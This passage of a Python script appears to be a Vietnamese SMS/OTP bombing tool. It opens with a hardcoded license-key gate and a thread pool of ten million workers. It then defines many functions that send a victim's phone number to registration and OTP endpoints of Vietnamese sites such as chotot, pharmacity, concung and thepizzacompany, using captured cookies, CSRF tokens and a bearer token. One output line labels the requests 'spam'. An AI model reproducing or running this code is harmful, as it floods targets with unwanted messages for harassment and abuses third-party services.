    if saved_key == Key or saved_key == "vLong Decdeptrais" or saved_key == keytb or saved_key == "ThienTu":
        key = Key
        
    else:
        key = input(f"\033[0m\033[1m\033[34mVui lòng nhập key: \033[92m")
        save_key_to_file(key)
else:
    print(f"{do}Vui lòng điền Y hoặc N")
    exit()
    
saved_keys = read_key_from_file()
if saved_keys == Key:
  tct = tcts
elif saved_keys == keytb:
  tct = tct_vip
elif saved_keys == "vLong":
  tct = tct_vip
elif saved_keys == "vLong":
  tct = tct_vip
while True:
    if key !=Key and key != "vLong" and key != keytb and key != "vLong":
        print("\033[91m\033[1mKey sai!")
    else:
        clear()
        runbanner(tct)
        break


#====================================================================================================================================================================
threading1 = ThreadPoolExecutor(max_workers=int(10000000))
def regthantaioi(sdt):
  headers = {
    'Host': 'api.thantaioi.vn',
    #'content-length': '186',
    'accept-language': 'vi',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'origin': 'https://thantaioi.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://thantaioi.vn/user/registration/reg1',
    #'accept-encoding': 'gzip, deflate, br'
}
  data = json.dumps(
  {"full_name":"Nguyễn Thanh Nam","first_name":"Nam","last_name":"Nguyễn","mobile_phone":"84"+sdt[1:],"target_url":"thantaioi.vn/?utm_source=google&utm_medium=organic&utm_campaign=organic"})
  response = requests.post('https://api.thantaioi.vn/api/user', data=data,headers=headers).json()
  
  global tokenthantaioi
  tokenthantaioi = response['token']
  print("\033[1;32m|spam|---->thành công|regthantaioi|")
def takomo(sdt):
  headers = {
    'Host': 'lk.takomo.vn',
    # 'content-length': '63',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://lk.takomo.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.1322990889.1691892176; _gid=GA1.2.1712469938.1691892180; _gat_UA-187725374-2=1; _hjFirstSeen=1; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6IjRkMTM2YmI3LWMwZTMtNDViYi04Y2RlLWVmZTEwMDNjOTcyMSIsImNyZWF0ZWQiOjE2OTE4OTIxODI5OTEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1691892183149.361720121; _tt_enable_cookie=1; _ttp=rolXX5eW4teiY32zQW6AhD4vgnU; _fw_crm_v=c75bd27f-15ee-4b55-c659-dcb46da7d3e8; _hjSessionUser_2281843=eyJpZCI6IjBkZmZkMTM5LTdkYzYtNTQ1OS04Njg5LTNmYmMwZjg4YjIyNSIsImNyZWF0ZWQiOjE2OTE4OTIxODI5MTAsImV4aXN0aW5nIjp0cnVlfQ==; _ga_K15C064VTW=GS1.2.1691892186.1.1.1691892195.51.0.0; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDMzODYwNzI0NQ.AuMP_7aZ-Nzl2IRO_r4s-uc-YPsmrSqJGHqyMw_WMQ8; _gat_UA-187725374-1=1; _ga=GA1.1.2029320197.1691892180; _ga_ZN0EBP68G5=GS1.1.1691892223.1.0.1691892224.59.0.0; _ga_ZBQ18M247M=GS1.1.1691892181.1.1.1691892225.16.0.0; _ga_03H0F9NHEX=GS1.2.1691892225.1.0.1691892226.59.0.0',
}
  data = '{"data":{"phone":"sdt","code":"resend","channel":"ivr"}}'.replace('sdt',sdt)
  response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', headers=headers, data=data).text

def bibabo(sdt):
  headers = {
    'Host': 'bibabo.vn',
    'Connection': 'keep-alive',
    # 'Content-Length': '64',
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://bibabo.vn',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://bibabo.vn/user/signupPhone',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_ui_bi_=eyJpdiI6IkZQNG9kOUZEVHdHRkw1cVBOOTF4Smc9PSIsInZhbHVlIjoibHpjZTlpbEhtN0VNVFhKNFwvS2V3XC85ZTIrUlwvNk5HYU1WdzRYeWpOdmhiaz0iLCJtYWMiOiI1NGQyZmM3NjE4MzE2NzQ3NGMyMjQ4M2FiZTBhN2E3M2EzZTJhMjM5NDJkMzcxZGU4OThiYWJhYmQ1YmFiYjAxIn0%3D; _gid=GA1.2.261767571.1691888491; mp_376a95ebc99b460db45b090a5936c5de_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A189ec699ad6ade-0cf9598c634b9f-1a203021-38400-189ec699ad7adf%22%2C%22%24device_id%22%3A%20%22189ec699ad6ade-0cf9598c634b9f-1a203021-38400-189ec699ad7adf%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; _fbp=fb.1.1691888491341.1918851086; _gat=1; _ga=GA1.1.1813680014.1691888491; _ga_B05J0DJ8VM=GS1.1.1691888492.1.1.1691888493.0.0.0; gaVisitorUuid=cdea3535-e7d1-4fe7-823c-26aaab984e3d; XSRF-TOKEN=eyJpdiI6Iml6b1ROSUZXV1JoQWE5azFNRjRpYVE9PSIsInZhbHVlIjoicEhqODdzbUM1OUZhcW5jZmxzMVlmSjM2VmRVWE5PRTQ1ZE9RcEtub1ZybVJxZU9ZMCtyWGpKTnd2eFFGckJnV2NaWW5IdWpETTdMZWRxU1FHU3lmb3c9PSIsIm1hYyI6ImYwYTRiNTA2N2NjY2VjNDZmYTA1NGNlYzQxOGVjYTU5OWNhNTlmM2I4NmY1Mzc0MjQzNzUyMTNhM2VkOWMyNTYifQ%3D%3D; laravel_session=eyJpdiI6Im1IUUdLRGF0TjlpckljamkyS0ZxdEE9PSIsInZhbHVlIjoiV3JyaWduWmFxclNxcUUyK2FNSnZjMHFqOUJRd01cL1hWY2FcL09oNWtPZWVBUGVFM3VzV0lSSkYxQlREb1krQ1libUxjaXNZTlhqTmc0TnRwWlJjSVwvenc9PSIsIm1hYyI6IjkxZGMxOWRhZThlODMxNmUwMjM5MjBhNWRkY2I1MTA2MWFhNDEzYjllNTllMTEzMDUzNzhjZmM2NTJlOTBjNjgifQ%3D%3D',
}
  data = {
    'phone': f'{sdt}',
    '_token': '3ekXaZ227m0YVvU8gNY8U3XIBHDT2vTvLong DecBg5ZaBS',
}
  response = requests.post('https://bibabo.vn/user/verify-phone', headers=headers, data=data).text

def cashbar(sdt):
  headers = {
    'Host': 'api.cashbar.tech',
    # 'content-length': '73',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://h5.cashbar.work',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://h5.cashbar.work/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = {
    'phone': f'{sdt}',
    'type': '2',
    'ctype': '1',
    'chntoken': '7f38e65de6b47136eaa373feade6cd33',
  }
  response = requests.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', headers=headers, data=data).json()

def chotot(sdt):
  headers = {
    'Host': 'gateway.chotot.com',
    # 'content-length': '22',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'origin': 'https://id.chotot.com',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://id.chotot.com/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    
  }
  data = '{"phone":"sdt"}'.replace("sdt",sdt)
  response = requests.post('https://gateway.chotot.com/v2/public/auth/send_otp_verify', headers=headers, data=data).json()

def pizzacompany(sdt):
  cookies = {
    '_gcl_au': '1.1.607819339.1691276885',
    '_ga': 'GA1.2.453948248.1691276886',
    '_gid': 'GA1.2.698696022.1691276886',
    '_tt_enable_cookie': '1',
    '_ttp': 'bwCYo8Ir1_CxxhKbysJDt5JtlQ7',
    '_fbp': 'fb.1.1691276888170.1960321660',
    '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8',
    '.Nop.Customer': 'ccaefc12-aefb-4b4d-8b87-776f2ee9af1f',
    '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jvLong DecGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
  }
  headers = {
    'Host': 'thepizzacompany.vn',
    # 'content-length': '199',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://thepizzacompany.vn',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://thepizzacompany.vn/Otp',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.607819339.1691276885; _ga=GA1.2.453948248.1691276886; _gid=GA1.2.698696022.1691276886; _tt_enable_cookie=1; _ttp=bwCYo8Ir1_CxxhKbysJDt5JtlQ7; _fbp=fb.1.1691276888170.1960321660; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8; .Nop.Customer=ccaefc12-aefb-4b4d-8b87-776f2ee9af1f; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jvLong DecGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
  }
  data = {
    'phone': f'{sdt}',
    '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfbQwvToQkkGuj4TN2sRcEQ1WYLq8FZcCaAf8P9JHU46UhpBthj5H4JH3oJjwi0hx_zMAPEMRGPK6X6QnCzHwfMW_RhUnFUsBEDrss3f32LBDTUcbq9dohqqQZr2VFE9Ns',
  }
  response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data).json()

def onecredit(sdt):
  cookies = {
    'SN5c8116d5e6183': 'vd0peh2340qie49h8hksc6mktb',
    'OnCredit_id': '64cc576f3fcca5.61640209',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': '1eoY0fSNX4knqqaR+yewjR0dHrPCV8i0u+EA2ZEdAag=',
    '_fbp': 'fb.1.1691113338133.1121666643',
    'GN_USER_ID_KEY': '1b7eaaea-150b-4d8d-8250-69d546c1c1cb',
    '_ga_462Z3ZX24C': 'GS1.1.1691244602.2.1.1691244602.60.0.0',
    '_ga': 'GA1.2.148691698.1691113336',
    '_gid': 'GA1.2.1794411839.1691244604',
    '_gat_UA-139625802-1': '1',
    'GN_SESSION_ID_KEY': '43953d57-7d12-402f-ae07-ad1786e8ca8b',
    '_ga_4RZFMB042P': 'GS1.2.1691244607.2.0.1691244607.60.0.0',
  }
  headers = {
    'Host': 'oncredit.vn',
    # 'content-length': '231',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://oncredit.vn',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://oncredit.vn/registration',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'SN5c8116d5e6183=vd0peh2340qie49h8hksc6mktb; OnCredit_id=64cc576f3fcca5.61640209; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=1eoY0fSNX4knqqaR+yewjR0dHrPCV8i0u+EA2ZEdAag=; _fbp=fb.1.1691113338133.1121666643; GN_USER_ID_KEY=1b7eaaea-150b-4d8d-8250-69d546c1c1cb; _ga_462Z3ZX24C=GS1.1.1691244602.2.1.1691244602.60.0.0; _ga=GA1.2.148691698.1691113336; _gid=GA1.2.1794411839.1691244604; _gat_UA-139625802-1=1; GN_SESSION_ID_KEY=43953d57-7d12-402f-ae07-ad1786e8ca8b; _ga_4RZFMB042P=GS1.2.1691244607.2.0.1691244607.60.0.0',
  } 
  params = {
    'ajax': '',
  }
  data = {
    'data[typeData]': 'sendCodeReg',
    'data[phone]': f'{sdt}',
    'data[email]': 'kdish12@gmail.com',
    'data[captcha1]': '1',
    'data[lang]': 'vi',
    'CSRFName': 'CSRFGuard_ajax',
    'CSRFToken': '59sZQFn8SF73FiA6bifZRTdRE2Eand5G77e93NDzfiKiRSH3Tbhe4tSdB3yHD2sf',
  }
  response = requests.post('https://oncredit.vn/', params=params, cookies=cookies, headers=headers, data=data).json()

def concung(sdt):
  cookies = {
    'PHPSESSID': 'ij419v9ov5ug09ui6t5v6hul56',
    '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3DBpy7szeD03E%3DXv5zU4fvoPk%3DptVtroTCTyo%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3Dc7XLOffW%2BH0%3Dc7gCysNyQxY%3DCNgWpQ5YeKY%3DD7U33jY70Ks%3D',
    '__utmc': '65249340',
    '__utmz': '65249340.1691112234.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    '_ga': 'GA1.1.1576173301.1691112237',
    '_gcl_au': '1.1.601691012.1691112237',
    '_fbp': 'fb.1.1691112237077.759562086',
    '_tt_enable_cookie': '1',
    '_ttp': 'JyO6InY4cht34vkn0PUDBvJMCx5',
    '__utma': '65249340.412064474.1691112234.1691112234.1691138671.2',
    '__utmt': '1',
    'Srv': 'cc205|ZMy49|ZMy4w',
    '__utmb': '65249340.3.10.1691138671',
    '_ga_DFG3FWNPBM': 'GS1.1.1691138672.2.1.1691138724.8.0.0',
    '_ga_BBD6001M29': 'GS1.1.1691138674.2.1.1691138726.8.0.0',
  }
  headers = {
    'Host': 'concung.com',
    # 'content-length': '167',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://concung.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://concung.com/dang-nhap.html',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'PHPSESSID=ij419v9ov5ug09ui6t5v6hul56; 6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3DBpy7szeD03E%3DXv5zU4fvoPk%3DptVtroTCTyo%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3Dc7XLOffW%2BH0%3Dc7gCysNyQxY%3DCNgWpQ5YeKY%3DD7U33jY70Ks%3D; __utmc=65249340; __utmz=65249340.1691112234.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _ga=GA1.1.1576173301.1691112237; _gcl_au=1.1.601691012.1691112237; _fbp=fb.1.1691112237077.759562086; _tt_enable_cookie=1; _ttp=JyO6InY4cht34vkn0PUDBvJMCx5; __utma=65249340.412064474.1691112234.1691112234.1691138671.2; __utmt=1; Srv=cc205|ZMy49|ZMy4w; __utmb=65249340.3.10.1691138671; _ga_DFG3FWNPBM=GS1.1.1691138672.2.1.1691138724.8.0.0; _ga_BBD6001M29=GS1.1.1691138674.2.1.1691138726.8.0.0',
  }
  data = {
    'ajax': '1',
    'classAjax': 'AjaxLogin',
    'methodAjax': 'sendOtpLogin',
    'customer_phone': f'{sdt}',
    'id_customer': '1',
    'static_token': 'e633865a31fa27f35b8499e1a75b0a76',
    'momoapp': '0',
    'back': 'khach-hang.html',
  }
  response = requests.post('https://concung.com/ajax.html',cookies=cookies, headers=headers,data=data).json()

def y360(sdt):
  headers = {
    'Host': 'y360.vn',
    # 'content-length': '22',
    'accept': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://y360.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://y360.vn/hoc/register',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.977893193.1691134633; _gid=GA1.2.1747107574.1691134633; _gat_gtag_UA_211029013_1=1; _fbp=fb.1.1691134636760.1633963715; _ga=GA1.1.329512893.1691134633; _ga_M7ZN50PQ1V=GS1.1.1691134632.1.1.1691134646.0.0.0; _ga_BS2V9QEV6V=GS1.1.1691134633.1.1.1691134667.0.0.0',
    }
  data = '{"phone":"sdt"}'.replace("sdt",sdt)
  response = requests.post('https://y360.vn/api/v1/user/register', data=data, headers=headers).json()
  global valuey360
  valuey360 = response['errors']

def y360rs(sdt):
  headers = {
    'Host': 'y360.vn',
    # 'content-length': '689',
    'accept': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://y360.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://y360.vn/hoc/register/code-verify/dbde2f96-3299-11ee-a400-0242ac150006',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.977893193.1691134633; _gid=GA1.2.1747107574.1691134633; _fbp=fb.1.1691134636760.1633963715; _gat_gtag_UA_211029013_1=1; _ga_M7ZN50PQ1V=GS1.1.1691134632.1.1.1691135104.0.0.0; _ga=GA1.1.329512893.1691134633; _ga_BS2V9QEV6V=GS1.1.1691134633.1.1.1691135122.0.0.0',
  }
  data = valuey360.encode()
  response = requests.post('https://y360.vn/api/v1/user/resendCode', data=data, headers=headers).json()

def phamacy(sdt):
  headers = {
    'Host': 'api-gateway.pharmacity.vn',
    # 'content-length': '36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'origin': 'https://www.pharmacity.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.pharmacity.vn/',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"phone":"sdt","referral":""}'.replace("sdt",sdt)
  response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', data=data,headers=headers)

def vayvnd(sdt):
  data = '{"phone":"sdt","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite":3}'.replace("sdt",sdt)
  head = {
    "Host":"api.vayvnd.vn",
    "accept":"application/json",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "site-id":"3",
    "content-type":"application/json; charset=utf-8",
    "origin":"https://vayvnd.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vayvnd.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vayvnd.vn/v2/users",data=data,headers=head).json()

def ubofood(sdt):
  headers = {
    'Host': 'ubofood.com',
    'Connection': 'keep-alive',
    # 'Content-Length': '54',
    'Accept': 'application/json, text/plain, */*',
    'Cache-Control': 'no-cache',
    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkvLong DecIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://ubofood.com',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://ubofood.com/register',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_gcl_au=1.1.1893195422.1691887985; _ga=GA1.1.920343154.1691887985; _tt_enable_cookie=1; _ttp=W3eMdboFrsZyxJg3xa7ZNN35ySW; _fbp=fb.1.1691887986713.850575362; ubo_trade=%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22760%22%2C%22name%22%3A%22Qu%E1%BA%ADn%201%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2226740%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9%22%7D%2C%22text%22%3A%2206%20Th%C3%A1i%20V%C4%83n%20Lung%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.778755%2C%22lng%22%3A106.70528%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-06-15T03%3A15%3A26.154Z%22%2C%22updated_by%22%3A%22anhltt%22%2C%22default_pos_code%22%3A%22379760001%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkvLong DecIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU; _ga_KCGG79N4SY=GS1.1.1691887985.1.1.1691887993.0.0.0; _ga_3PKTQRQF3P=GS1.1.1691887985.1.1.1691888009.36.0.0',
}
  data = '{"phone_number":"sdt","trade_code":"379760000"}'.replace('sdt',sdt)
  response = requests.post('https://ubofood.com/api/v1/account/customers/register', headers=headers, data=data).text

